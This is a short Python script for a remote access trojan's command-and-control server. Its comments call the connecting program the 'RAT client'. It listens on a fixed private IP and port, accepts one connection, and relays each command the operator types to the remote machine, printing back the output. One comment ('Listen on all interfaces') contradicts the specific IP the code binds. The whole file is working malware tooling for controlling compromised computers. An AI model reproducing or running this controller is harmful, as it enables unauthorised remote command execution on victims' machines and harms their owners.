import socket

# Server IP and Port
HOST = '192.168.1.24'  # Listen on all interfaces
PORT = 9999       # Use a non-privileged port
# Set up the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Server listening on {HOST}:{PORT}")
# Accept incoming connection from the RAT client
client_socket, client_address = server_socket.accept()
print(f"Connection from {client_address}")
# Loop to send commands
while True:
    command = input("Enter command to execute: ")
    if command.lower() == 'exit':
        break
    client_socket.send(command.encode())
    response = client_socket.recv(1024).decode()
    print(f"Client response: {response}")
client_socket.close()
server_socket.close()
